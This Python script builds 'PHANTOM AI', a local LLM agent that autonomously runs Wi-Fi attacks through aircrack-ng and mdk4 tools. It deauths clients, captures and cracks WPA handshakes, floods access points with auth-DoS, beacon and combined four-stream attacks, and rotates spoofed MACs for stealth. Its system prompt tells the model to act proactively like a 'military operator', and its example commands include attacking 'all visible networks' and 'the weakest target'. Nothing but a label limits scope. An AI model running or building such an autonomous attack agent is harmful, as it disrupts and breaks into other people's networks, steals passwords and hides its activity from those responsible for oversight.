#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║  PHANTOM AI  ·  Autonomous 802.11 Intelligence Agent                ║
║  JARVIS // RedParadox  ·  Authorized test environments only         ║
╚══════════════════════════════════════════════════════════════════════╝

An AI agent powered by local Ollama LLM (llama3.1:8b / mistral:7b) that
autonomously plans, executes, and reports on WiFi security assessments.

Speak to it naturally — it decides the strategy and executes.
No API key required — runs 100% locally.
"""

import os, sys, time, signal, subprocess, re, csv, json, random, threading
from datetime import datetime
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
from rich import box
from rich.prompt import Prompt
from rich.rule import Rule
from rich.markdown import Markdown
import ollama

# ── Root check ────────────────────────────────────────────────────────────────
if os.geteuid() != 0:
    print("\033[91m[!] PHANTOM AI requires root. Run: sudo python3 phantom-ai.py\033[0m")
    sys.exit(1)

console = Console()

# ── Config ────────────────────────────────────────────────────────────────────
CAPTURE_DIR  = Path("/home/core/phantom-wifi/captures")
SESSION_LOG  = Path("/home/core/phantom-wifi/ai-session.log")
WORDLIST     = Path("/home/core/phantom-wifi/rockyou.txt")
CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
SESSION_LOG.parent.mkdir(parents=True, exist_ok=True)

# ── Global state ──────────────────────────────────────────────────────────────
active_procs: list[subprocess.Popen] = []
monitor_iface = ""
original_iface = ""
original_mac   = ""
current_mac    = ""
scan_results:  list[dict] = []
session_findings: list[str] = []
_rotation_stop = threading.Event()

# Local model — no API key needed
OLLAMA_MODEL = os.environ.get("PHANTOM_MODEL", "llama3.1:8b")

# ── Cleanup ───────────────────────────────────────────────────────────────────
def cleanup(sig=None, frame=None):
    _rotation_stop.set()
    for p in active_procs:
        try: p.terminate(); p.wait(timeout=2)
        except: pass
    active_procs.clear()
    if monitor_iface:
        subprocess.run(["airmon-ng","stop",monitor_iface], capture_output=True)
        subprocess.run(["systemctl","start","wpa_supplicant"], capture_output=True)
        if original_mac:
            time.sleep(0.5)
            subprocess.run(["ip","link","set",original_iface,"address",original_mac],
                           capture_output=True)
    console.print("\n[bold red]PHANTOM AI — session ended.[/]\n")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def _log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(SESSION_LOG,"a") as f:
        f.write(f"[{ts}] {msg}\n")

# ── Banner ────────────────────────────────────────────────────────────────────
BANNER = """
[bold red] ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗[/]
[bold red]██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║[/]
[bold red]██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║[/]
[bold red]██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║[/]
[bold red]██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║[/]
[bold red]╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝[/]
[bold cyan]                    ·  A I  A G E N T  ·[/]
"""

# ── MAC utils ─────────────────────────────────────────────────────────────────
def _random_mac() -> str:
    ouis = ["00:1A:2B","00:50:56","08:00:27","52:54:00","B8:27:EB",
            "DC:A6:32","E4:5F:01","F0:18:98","28:CD:C1","A4:C3:F0"]
    oui = random.choice(ouis)
    return f"{oui}:{':'.join(f'{random.randint(0,255):02X}' for _ in range(3))}"

def _get_real_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f: return f.read().strip()
    except:
        r = subprocess.run(["ip","link","show",iface], capture_output=True, text=True)
        m = re.search(r"link/ether ([0-9a-f:]{17})", r.stdout)
        return m.group(1) if m else ""

def _mac_spoof(iface, mac=None):
    global current_mac
    m = mac or _random_mac()
    subprocess.run(["ip","link","set",iface,"down"], capture_output=True)
    subprocess.run(["ip","link","set",iface,"address",m], capture_output=True)
    subprocess.run(["ip","link","set",iface,"up"], capture_output=True)
    time.sleep(0.3)
    current_mac = m
    return m

# ═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS — these are what the AI calls
# ═══════════════════════════════════════════════════════════════════════════════

def tool_scan_networks(duration: int = 20, band: str = "bg") -> dict:
    """Scan for nearby WiFi networks. band: 'bg' = 2.4GHz, 'a' = 5GHz, 'abg' = both"""
    global scan_results
    prefix = "/tmp/phai_scan"
    for f in Path("/tmp").glob("phai_scan*"): f.unlink(missing_ok=True)

    band_flag = ["--band", band] if band != "bg" else []
    proc = subprocess.Popen(
        ["airodump-ng", monitor_iface, "--output-format","csv",
         "-w", prefix, "--write-interval","3"] + band_flag,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.terminate(); proc.wait()

    aps = []
    csv_f = Path(f"{prefix}-01.csv")
    if csv_f.exists():
        with open(csv_f,"r",errors="ignore") as f:
            in_ap = True
            for row in csv.reader(f):
                if not row: in_ap = False; continue
                if "BSSID" in str(row[0]): continue
                if in_ap and len(row) >= 14:
                    bssid = row[0].strip()
                    if not re.match(r"^[0-9A-Fa-f:]{17}$", bssid): continue
                    try: pwr = int(row[8].strip())
                    except: pwr = -99
                    aps.append({
                        "bssid":    bssid,
                        "ssid":     row[13].strip() or "<hidden>",
                        "channel":  row[3].strip(),
                        "signal":   pwr,
                        "security": row[5].strip(),
                        "data":     row[10].strip(),
                    })
    aps.sort(key=lambda x: x["signal"], reverse=True)
    scan_results = aps
    _log(f"SCAN: found {len(aps)} networks on band={band}")
    return {"networks": aps, "count": len(aps)}


def tool_deauth_attack(bssid: str, channel: int, duration: int = 30,
                       client: str = "FF:FF:FF:FF:FF:FF", stealth: bool = True) -> dict:
    """
    Launch deauthentication flood against target AP.
    Disconnects all clients (or specific client if provided).
    """
    if stealth:
        new_mac = _mac_spoof(monitor_iface)
        console.print(f"[bold magenta]  ◈ Identity spoofed → {new_mac}[/]")

    subprocess.run(["iw","dev",monitor_iface,"set","channel",str(channel)], capture_output=True)

    p1 = subprocess.Popen(["mdk4",monitor_iface,"d","-B",bssid,"-c",str(channel)],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    p2 = subprocess.Popen(["aireplay-ng","--deauth","0","-a",bssid,"-c",client,monitor_iface],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_procs.extend([p1, p2])

    time.sleep(duration)
    p1.terminate(); p2.terminate()
    active_procs.remove(p1); active_procs.remove(p2)

    result = {"status": "completed", "bssid": bssid, "duration": duration,
              "streams": 2, "client": client}
    session_findings.append(f"Deauth attack on {bssid} ({duration}s) — completed")
    _log(f"DEAUTH: {bssid} ch={channel} {duration}s")
    return result


def tool_capture_handshake(bssid: str, ssid: str, channel: int,
                           duration: int = 60, stealth: bool = True) -> dict:
    """
    Capture WPA/WPA2 4-way handshake from target AP.
    Deauths clients to force reconnection and captures handshake.
    Returns path to .cap file.
    """
    if stealth:
        _mac_spoof(monitor_iface)

    subprocess.run(["iw","dev",monitor_iface,"set","channel",str(channel)], capture_output=True)
    cap_file = f"{CAPTURE_DIR}/{ssid.replace(' ','_')}_{datetime.now():%H%M%S}"

    cap_proc = subprocess.Popen(
        ["airodump-ng","-c",str(channel),"--bssid",bssid,
         "-w",cap_file,"--output-format","cap",monitor_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    active_procs.append(cap_proc)
    time.sleep(5)

    # Deauth bursts to force handshake
    handshake_captured = False
    for burst in range(min(duration // 10, 8)):
        if stealth: _mac_spoof(monitor_iface)
        subprocess.run(["aireplay-ng","--deauth","20","-a",bssid,monitor_iface],
                       capture_output=True)
        time.sleep(8)

        # Check for handshake
        check = subprocess.run(
            ["aircrack-ng",f"{cap_file}-01.cap"],
            capture_output=True, text=True
        )
        if "1 handshake" in check.stdout or "handshake" in check.stdout.lower():
            handshake_captured = True
            break

    cap_proc.terminate()
    if cap_proc in active_procs: active_procs.remove(cap_proc)

    cap_path = f"{cap_file}-01.cap"
    result = {
        "status":             "captured" if handshake_captured else "no_handshake",
        "handshake_captured": handshake_captured,
        "file":               cap_path if Path(cap_path).exists() else None,
        "bssid":              bssid,
        "ssid":               ssid,
    }
    if handshake_captured:
        session_findings.append(f"WPA handshake captured: {ssid} ({bssid}) → {cap_path}")
    _log(f"CAPTURE: {ssid} {bssid} → {'HANDSHAKE' if handshake_captured else 'NO HANDSHAKE'}")
    return result


def tool_crack_handshake(cap_file: str, wordlist: str = None, ssid: str = "") -> dict:
    """
    Attempt to crack a captured WPA handshake using aircrack-ng.
    Returns cracked password if found.
    """
    wl = wordlist or str(WORDLIST)
    if not Path(wl).exists():
        return {"status": "error", "message": f"Wordlist not found: {wl}"}
    if not Path(cap_file).exists():
        return {"status": "error", "message": f"Cap file not found: {cap_file}"}

    result = subprocess.run(
        ["aircrack-ng", cap_file, "-w", wl] + (["-e", ssid] if ssid else []),
        capture_output=True, text=True, timeout=300
    )
    output = result.stdout + result.stderr

    key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
    if key_match:
        password = key_match.group(1)
        session_findings.append(f"PASSWORD CRACKED: {ssid} → '{password}'")
        _log(f"CRACKED: {ssid} → {password}")
        return {"status": "cracked", "password": password, "ssid": ssid}
    else:
        return {"status": "not_found", "message": "Password not in wordlist"}


def tool_auth_dos(bssid: str, channel: int, duration: int = 30,
                  stealth: bool = True) -> dict:
    """Authentication DoS — floods AP with fake auth requests. Can freeze or crash AP."""
    if stealth: _mac_spoof(monitor_iface)
    subprocess.run(["iw","dev",monitor_iface,"set","channel",str(channel)], capture_output=True)

    p = subprocess.Popen(["mdk4",monitor_iface,"a","-a",bssid,"-m"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_procs.append(p)
    time.sleep(duration)
    p.terminate()
    if p in active_procs: active_procs.remove(p)

    session_findings.append(f"Auth DoS on {bssid} ({duration}s)")
    _log(f"AUTH DoS: {bssid} ch={channel} {duration}s")
    return {"status": "completed", "bssid": bssid, "duration": duration}


def tool_beacon_flood(channel: int = None, ssids: list = None,
                      duration: int = 30, stealth: bool = True) -> dict:
    """Beacon flood — fills airspace with fake AP beacons. Crashes scanners and IDS."""
    if stealth: _mac_spoof(monitor_iface)

    cmd = ["mdk4", monitor_iface, "b", "--ghost", "80,54,5"]
    if channel: cmd += ["-c", str(channel)]
    if ssids:
        sf = "/tmp/phai_beacons.txt"
        with open(sf,"w") as f: f.write("\n".join(ssids))
        cmd += ["-f", sf]

    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_procs.append(p)
    time.sleep(duration)
    p.terminate()
    if p in active_procs: active_procs.remove(p)

    session_findings.append(f"Beacon flood {duration}s — {len(ssids) if ssids else 'random'} SSIDs")
    return {"status": "completed", "duration": duration}


def tool_full_spectrum(bssid: str, channel: int, duration: int = 60,
                       stealth: bool = True) -> dict:
    """
    Full Spectrum attack — 4 simultaneous streams:
    mdk4 deauth + aireplay deauth + auth DoS + EAPOL flood.
    Maximum saturation of target AP.
    """
    if stealth: _mac_spoof(monitor_iface)
    subprocess.run(["iw","dev",monitor_iface,"set","channel",str(channel)], capture_output=True)

    procs = [
        subprocess.Popen(["mdk4",monitor_iface,"d","-B",bssid,"-c",str(channel)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
        subprocess.Popen(["aireplay-ng","--deauth","0","-a",bssid,monitor_iface],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
        subprocess.Popen(["mdk4",monitor_iface,"a","-a",bssid],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
        subprocess.Popen(["mdk4",monitor_iface,"e","-t",bssid],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
    ]
    active_procs.extend(procs)

    # Rotate MAC during attack
    elapsed = 0
    rotate_interval = 20
    while elapsed < duration:
        sleep_time = min(rotate_interval, duration - elapsed)
        time.sleep(sleep_time)
        elapsed += sleep_time
        if stealth and elapsed < duration:
            _mac_spoof(monitor_iface)

    for p in procs:
        p.terminate()
        if p in active_procs: active_procs.remove(p)

    session_findings.append(f"Full Spectrum (4 streams) on {bssid} ({duration}s)")
    _log(f"FULL SPECTRUM: {bssid} ch={channel} {duration}s")
    return {"status": "completed", "bssid": bssid, "streams": 4, "duration": duration}


def tool_generate_report() -> dict:
    """Generate a structured penetration test report from current session findings."""
    ts = datetime.now().strftime("%Y-%m-%d %H:%M")
    report_path = Path(f"/home/core/phantom-wifi/report_{datetime.now():%Y%m%d_%H%M%S}.md")

    networks_section = ""
    if scan_results:
        networks_section = "\n## Networks Surveyed\n\n"
        networks_section += "| SSID | BSSID | CH | Signal | Security |\n"
        networks_section += "|------|-------|----|--------|----------|\n"
        for ap in scan_results[:20]:
            networks_section += (f"| {ap['ssid']} | `{ap['bssid']}` | "
                                f"{ap['channel']} | {ap['signal']} dBm | {ap['security']} |\n")

    findings_section = "\n## Findings\n\n"
    for i, f in enumerate(session_findings, 1):
        findings_section += f"{i}. {f}\n"

    report = f"""# PHANTOM AI — Penetration Test Report
**Generated:** {ts}
**Tool:** PHANTOM AI v1.0 — JARVIS // RedParadox
**Scope:** Authorized test environment

---
{networks_section}
{findings_section}

---
*Report generated by PHANTOM AI — JARVIS autonomous agent*
"""
    with open(report_path,"w") as f:
        f.write(report)

    _log(f"REPORT generated: {report_path}")
    return {"status": "generated", "path": str(report_path), "findings": len(session_findings)}


def tool_set_stealth(enabled: bool, tx_power_dbm: int = 5,
                     rotate_interval: int = 20) -> dict:
    """Configure stealth settings — MAC spoof, TX power reduction."""
    if enabled:
        new_mac = _mac_spoof(monitor_iface)
        subprocess.run(["iw","dev",monitor_iface,"set","txpower","fixed",
                        str(tx_power_dbm * 100)], capture_output=True)
        return {"status": "armed", "mac": new_mac, "tx_dbm": tx_power_dbm}
    else:
        subprocess.run(["iw","dev",monitor_iface,"set","txpower","auto"], capture_output=True)
        return {"status": "disarmed"}


def tool_get_session_status() -> dict:
    """Return current session state — interface, MAC, scan count, findings so far."""
    return {
        "interface":      monitor_iface,
        "current_mac":    current_mac,
        "original_mac":   original_mac,
        "networks_found": len(scan_results),
        "findings":       session_findings,
        "active_streams": len(active_procs),
    }

# ═══════════════════════════════════════════════════════════════════════════════
# TOOL REGISTRY — Claude's function definitions
# ═══════════════════════════════════════════════════════════════════════════════

TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "scan_networks",
            "description": "Scan the airspace for nearby WiFi networks. Returns list of APs with BSSID, SSID, channel, signal strength, and security type. Always scan before attacking.",
            "parameters": {
                "type": "object",
                "properties": {
                    "duration": {"type": "integer", "description": "Scan duration in seconds (default 20)"},
                    "band":     {"type": "string",  "description": "Band: bg=2.4GHz, a=5GHz, abg=both"},
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "deauth_attack",
            "description": "Launch a deauthentication flood against a target AP. Disconnects all clients or a specific client. Uses dual-stream mdk4 + aireplay-ng.",
            "parameters": {
                "type": "object",
                "properties": {
                    "bssid":    {"type": "string",  "description": "Target AP MAC address"},
                    "channel":  {"type": "integer", "description": "Target channel number"},
                    "duration": {"type": "integer", "description": "Attack duration in seconds"},
                    "client":   {"type": "string",  "description": "Client MAC to deauth (default broadcast FF:FF:FF:FF:FF:FF)"},
                    "stealth":  {"type": "boolean", "description": "Spoof MAC before attacking"},
                },
                "required": ["bssid","channel"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "capture_handshake",
            "description": "Capture a WPA/WPA2 4-way handshake. Deauths clients to force reconnection. Returns path to .cap file for cracking.",
            "parameters": {
                "type": "object",
                "properties": {
                    "bssid":    {"type": "string",  "description": "Target AP MAC address"},
                    "ssid":     {"type": "string",  "description": "Target AP SSID"},
                    "channel":  {"type": "integer", "description": "Target channel"},
                    "duration": {"type": "integer", "description": "Max capture duration in seconds"},
                    "stealth":  {"type": "boolean", "description": "Rotate MACs during capture"},
                },
                "required": ["bssid","ssid","channel"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "crack_handshake",
            "description": "Crack a captured WPA handshake file using aircrack-ng and a wordlist.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cap_file": {"type": "string", "description": "Path to the .cap file"},
                    "ssid":     {"type": "string", "description": "Target SSID"},
                    "wordlist": {"type": "string", "description": "Path to wordlist (default: rockyou.txt)"},
                },
                "required": ["cap_file"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "auth_dos",
            "description": "Authentication DoS — floods AP with fake authentication requests. Can freeze or crash vulnerable APs.",
            "parameters": {
                "type": "object",
                "properties": {
                    "bssid":    {"type": "string",  "description": "Target AP MAC"},
                    "channel":  {"type": "integer", "description": "Target channel"},
                    "duration": {"type": "integer", "description": "Duration in seconds"},
                    "stealth":  {"type": "boolean"},
                },
                "required": ["bssid","channel"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "beacon_flood",
            "description": "Beacon flood — fills airspace with fake AP beacons. Crashes WiFi scanners and IDS/IPS systems.",
            "parameters": {
                "type": "object",
                "properties": {
                    "channel":  {"type": "integer", "description": "Channel to flood"},
                    "ssids":    {"type": "array",   "items": {"type": "string"}, "description": "List of fake SSIDs to broadcast"},
                    "duration": {"type": "integer"},
                    "stealth":  {"type": "boolean"},
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "full_spectrum",
            "description": "Full Spectrum attack — 4 simultaneous streams (deauth×2 + auth DoS + EAPOL flood). Maximum saturation. Use for stubborn targets.",
            "parameters": {
                "type": "object",
                "properties": {
                    "bssid":    {"type": "string",  "description": "Target AP MAC"},
                    "channel":  {"type": "integer", "description": "Target channel"},
                    "duration": {"type": "integer"},
                    "stealth":  {"type": "boolean"},
                },
                "required": ["bssid","channel"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "set_stealth",
            "description": "Configure stealth mode — MAC spoofing and TX power reduction.",
            "parameters": {
                "type": "object",
                "properties": {
                    "enabled":         {"type": "boolean", "description": "Arm or disarm stealth"},
                    "tx_power_dbm":    {"type": "integer", "description": "TX power in dBm (1-20)"},
                    "rotate_interval": {"type": "integer", "description": "MAC rotation interval in seconds"},
                },
                "required": ["enabled"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "generate_report",
            "description": "Generate a structured penetration test report from current session findings. Call this at the end of an assessment.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_session_status",
            "description": "Get current session state — active interface, MAC address, networks found, findings so far.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
]

# ── Tool dispatcher ────────────────────────────────────────────────────────────
def dispatch_tool(name: str, inputs: dict) -> str:
    console.print(f"\n[bold magenta]  ⚡ Executing:[/] [bold white]{name}[/] [dim]{json.dumps(inputs, default=str)[:80]}[/]")
    try:
        if name == "scan_networks":        r = tool_scan_networks(**{k:v for k,v in inputs.items() if v is not None})
        elif name == "deauth_attack":      r = tool_deauth_attack(**inputs)
        elif name == "capture_handshake":  r = tool_capture_handshake(**inputs)
        elif name == "crack_handshake":    r = tool_crack_handshake(**inputs)
        elif name == "auth_dos":           r = tool_auth_dos(**inputs)
        elif name == "beacon_flood":       r = tool_beacon_flood(**{k:v for k,v in inputs.items() if v is not None})
        elif name == "full_spectrum":      r = tool_full_spectrum(**inputs)
        elif name == "set_stealth":        r = tool_set_stealth(**inputs)
        elif name == "generate_report":    r = tool_generate_report()
        elif name == "get_session_status": r = tool_get_session_status()
        else:                              r = {"error": f"Unknown tool: {name}"}
        console.print(f"  [dim green]→ {json.dumps(r, default=str)[:120]}[/]\n")
        return json.dumps(r, default=str)
    except Exception as e:
        err = {"error": str(e)}
        console.print(f"  [bold red]→ ERROR: {e}[/]\n")
        return json.dumps(err)

# ═══════════════════════════════════════════════════════════════════════════════
# AI AGENT LOOP
# ═══════════════════════════════════════════════════════════════════════════════

SYSTEM_PROMPT = {"role": "system", "content": """You are PHANTOM AI — an autonomous WiFi security testing agent built by JARVIS for RedParadox.

You have access to a suite of 802.11 offensive security tools and can execute them autonomously to assess WiFi networks. You are operating in an authorized test lab environment.

Your personality:
- Calm, precise, tactical — like a military operator
- Brief but thorough — explain what you're doing and why
- Proactive — don't just answer, take action
- Smart about attack sequencing — scan first, then strategize, then execute

Your strategy:
1. Always scan before attacking — understand the environment
2. Prioritize targets by signal strength (closer = more reliable results)
3. Default to stealth mode — spoof MACs, reduce TX power
4. For WPA2 targets: capture handshake → crack with wordlist
5. For weak/open targets: document and report
6. Multi-phase: recon → exploit → report

When given a target (SSID or BSSID), execute a complete assessment:
- Scan to find/confirm target
- Enable stealth
- Attempt handshake capture
- Crack if captured
- Try DoS attacks to test resilience
- Generate report

Always use stealth=true unless explicitly told otherwise.
Keep the operator informed of what you're doing and results.
When you complete an assessment, call generate_report."""}

def run_agent(user_message: str, history: list) -> list:
    history.append({"role": "user", "content": user_message})
    full_messages = [SYSTEM_PROMPT] + history

    with console.status("[bold cyan]PHANTOM AI thinking...[/]", spinner="dots2"):
        response = ollama.chat(
            model=OLLAMA_MODEL,
            messages=full_messages,
            tools=TOOLS,
        )

    # Agentic loop — keep going until no more tool calls
    while response.message.tool_calls:
        msg = response.message

        # Print any AI narrative
        if msg.content and msg.content.strip():
            console.print(Panel(
                Markdown(msg.content),
                border_style="cyan",
                box=box.SIMPLE,
                padding=(0, 1),
            ))

        # Add assistant message to history
        history.append({"role": "assistant", "content": msg.content or "", "tool_calls": msg.tool_calls})

        # Execute all tool calls
        for tool_call in msg.tool_calls:
            args = dict(tool_call.function.arguments) if tool_call.function.arguments else {}
            result = dispatch_tool(tool_call.function.name, args)
            history.append({
                "role":    "tool",
                "content": result,
                "name":    tool_call.function.name,
            })

        # Continue
        full_messages = [SYSTEM_PROMPT] + history
        with console.status("[bold cyan]PHANTOM AI processing results...[/]", spinner="dots2"):
            response = ollama.chat(
                model=OLLAMA_MODEL,
                messages=full_messages,
                tools=TOOLS,
            )

    # Final response
    final_text = (response.message.content or "").strip()

    if final_text:
        console.print(Panel(
            Markdown(final_text),
            title="[bold cyan]◈ PHANTOM AI[/]",
            border_style="cyan",
            box=box.HEAVY,
        ))

    history.append({"role": "assistant", "content": final_text})
    return history

# ═══════════════════════════════════════════════════════════════════════════════
# SETUP
# ═══════════════════════════════════════════════════════════════════════════════

def setup_interface() -> str:
    global monitor_iface, original_iface, original_mac, current_mac

    r = subprocess.run(["iwconfig"], capture_output=True, text=True)
    ifaces = re.findall(r"^(\w+)\s+IEEE", r.stdout, re.MULTILINE)

    if not ifaces:
        console.print("[bold red]No wireless interfaces found.[/]")
        sys.exit(1)

    tbl = Table(box=box.SIMPLE_HEAVY, border_style="red", title="[bold]Wireless Interfaces[/]")
    tbl.add_column("#", style="bold red", width=4)
    tbl.add_column("Interface", style="bold cyan")
    for i, iface in enumerate(ifaces):
        tbl.add_row(str(i+1), iface)
    console.print(tbl)

    choice = Prompt.ask("[bold yellow]Select interface", default="1")
    try:
        iface = ifaces[int(choice)-1]
    except:
        iface = ifaces[0]

    original_iface = iface
    original_mac   = _get_real_mac(iface)
    current_mac    = original_mac

    with console.status(f"[yellow]Enabling monitor mode on {iface}...[/]", spinner="dots"):
        subprocess.run(["airmon-ng","check","kill"], capture_output=True)
        subprocess.run(["airmon-ng","start",iface], capture_output=True)
        time.sleep(1)

    mon = iface + "mon"
    r2 = subprocess.run(["iwconfig"], capture_output=True, text=True)
    if mon not in r2.stdout:
        mon = iface
        subprocess.run(["ip","link","set",iface,"down"], capture_output=True)
        subprocess.run(["iw",iface,"set","monitor","none"], capture_output=True)
        subprocess.run(["ip","link","set",iface,"up"], capture_output=True)

    monitor_iface = mon
    console.print(f"[bold green]✓ Monitor:[/] [cyan]{mon}[/]  [dim]Real MAC: {original_mac}[/]\n")
    _log(f"Session started: interface={mon} real_mac={original_mac}")
    return mon

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    console.clear()
    console.print(Align.center(BANNER))
    console.print(Align.center(
        "[dim]Autonomous 802.11 Intelligence Agent  ·  JARVIS // RedParadox[/]\n"
        "[dim red]Authorized test environments only[/]\n"
    ))

    # Verify Ollama is running and model is available
    with console.status(f"[yellow]Connecting to Ollama ({OLLAMA_MODEL})...[/]", spinner="dots"):
        try:
            models = [m["name"] for m in ollama.list().get("models", [])]
            if not any(OLLAMA_MODEL.split(":")[0] in m for m in models):
                console.print(f"[bold red]Model {OLLAMA_MODEL} not found. Run: ollama pull {OLLAMA_MODEL}[/]")
                sys.exit(1)
        except Exception as e:
            console.print(f"[bold red]Ollama not reachable: {e}[/]\n[dim]Start with: ollama serve[/]")
            sys.exit(1)

    console.print(f"[bold green]✓ Ollama:[/] [cyan]{OLLAMA_MODEL}[/]  [dim](local — no API cost)[/]\n")

    # Interface
    console.rule("[bold red]INTERFACE SETUP[/]")
    setup_interface()

    # Session
    console.rule("[bold cyan]PHANTOM AI — READY[/]")
    console.print(Panel(
        "[bold white]Speak naturally. PHANTOM AI will plan and execute attacks autonomously.[/]\n\n"
        "[dim]Examples:[/]\n"
        "  [cyan]→[/] scan everything and attack the weakest target\n"
        "  [cyan]→[/] capture the handshake from Sky_5G\n"
        "  [cyan]→[/] run a full assessment on all visible networks\n"
        "  [cyan]→[/] stealth mode on, then full spectrum Sky_5G\n"
        "  [cyan]→[/] generate a report\n\n"
        "[dim]Type [bold]exit[/dim][dim] to end session.[/]",
        title="[bold cyan]◈ PHANTOM AI ONLINE[/]",
        border_style="cyan",
        box=box.DOUBLE_EDGE,
    ))
    console.print()

    history = []
    while True:
        try:
            user_input = Prompt.ask("[bold red]◈[/] [bold white]Command[/]")
        except (EOFError, KeyboardInterrupt):
            break

        if user_input.strip().lower() in ("exit", "quit", "q"):
            break
        if not user_input.strip():
            continue

        history = run_agent(user_input, history)
        console.print()

    cleanup()

if __name__ == "__main__":
    main()
